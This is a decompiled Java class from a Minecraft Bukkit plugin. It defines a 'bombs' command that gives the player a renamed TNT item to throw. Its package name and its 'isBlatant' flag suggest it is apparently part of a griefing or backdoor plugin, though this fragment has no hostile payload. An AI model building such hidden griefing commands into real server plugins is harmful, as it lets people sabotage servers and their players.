/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class BombsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        p2.sendMessage(Settings.PREFIX("Right click to throw the bomb!"));
        ItemStack bomb = new ItemStack(Material.TNT, 1);
        ItemMeta meta = bomb.getItemMeta();
        meta.setDisplayName("§8§kI§c" + Settings.NAME + " Bomb§8§kI");
        bomb.setItemMeta(meta);
        p2.getInventory().addItem(new ItemStack[]{bomb});
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

